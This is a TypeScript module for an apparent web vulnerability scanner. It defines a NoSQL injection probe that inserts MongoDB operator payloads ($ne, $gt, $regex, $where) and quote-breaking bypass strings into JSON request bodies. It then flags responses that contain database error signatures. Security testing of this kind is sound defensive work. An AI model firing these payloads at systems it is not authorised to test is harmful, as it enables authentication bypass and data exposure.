import type { Probe } from "../types";
import { registerProbe } from "../registry";
import { Signatures } from "../detect/signatures";
import type { ProbeContext, ProbeResult } from "../../types";

const PAYLOADS: Record<string, unknown>[] = [
  { $ne: null },
  { $gt: "" },
  { $regex: ".*" },
  { $where: "1==1" },
];

const STRING_PAYLOADS = ["' || '1'=='1", "\" || \"1\"==\"1", "' || 1==1 //"];

function injectJson(ctx: ProbeContext, payload: unknown): ProbeContext {
  if (!ctx.body) return ctx;
  try {
    const j = JSON.parse(ctx.body) as Record<string, unknown>;
    const key = Object.keys(j)[0];
    if (!key) return ctx;
    j[key] = payload;
    return { ...ctx, body: JSON.stringify(j) };
  } catch { return ctx; }
}

function injectString(ctx: ProbeContext, payload: string): ProbeContext {
  if (!ctx.body) return ctx;
  try {
    const j = JSON.parse(ctx.body) as Record<string, unknown>;
    const key = Object.keys(j)[0];
    if (!key) return ctx;
    j[key] = payload;
    return { ...ctx, body: JSON.stringify(j) };
  } catch { return ctx; }
}

function detectNoSQLi(req: ProbeResult, baseline?: ProbeResult) {
  if (req.status === "ERR" || typeof req.status !== "number") return null;
  const sigs = Signatures.nosqli(req.bodyText);
  if (!sigs.length) return null;
  const statusOk = req.status >= 200 && req.status < 300;
  const baseOk = baseline && typeof baseline.status === "number"
    && baseline.status >= 200 && baseline.status < 300;
  if (!baseOk && !statusOk) return null;

  return {
    variantId: "nosqli.operator-injection",
    probeId: "inj.nosqli",
    probeLabel: "NoSQL Injection",
    group: "injection" as const,
    verdict: "CONFIRMED" as const,
    severity: "critical" as const,
    confidence: 0.9,
    evidence: `NoSQL error signature "${sigs[0]!.category}" in response`,
    diff: {
      statusBefore: typeof baseline?.status === "number" ? baseline.status : undefined,
      statusAfter: req.status,
    },
    requestUrl: req.url,
    requestMethod: req.method,
    requestBody: req.requestBody,
    responseSnippet: req.bodyText.slice(0, 400),
  };
}

export const nosqliProbe: Probe = {
  id: "inj.nosqli",
  label: "NoSQL Injection",
  group: "injection",
  description:
    "Injects MongoDB-style operators ($ne, $gt, $regex, $where) and JS-string bypass payloads " +
    "into the first JSON body field. Detects MongoDB/Mongoose error signatures.",
  appliesTo(ctx) {
    return Boolean(ctx.body) && ctx.method !== "GET" && ctx.method !== "HEAD";
  },
  variants: [
    {
      id: "nosqli.operator-injection",
      label: "NoSQLi · operator injection",
      group: "injection",
      severity: "critical",
      mutate: (ctx) => injectJson(ctx, PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)]!),
      detect: detectNoSQLi,
    },
    {
      id: "nosqli.string-bypass",
      label: "NoSQLi · string bypass",
      group: "injection",
      severity: "high",
      mutate: (ctx) => injectString(ctx, STRING_PAYLOADS[Math.floor(Math.random() * STRING_PAYLOADS.length)]!),
      detect: detectNoSQLi,
    },
  ],
};

registerProbe(nosqliProbe);
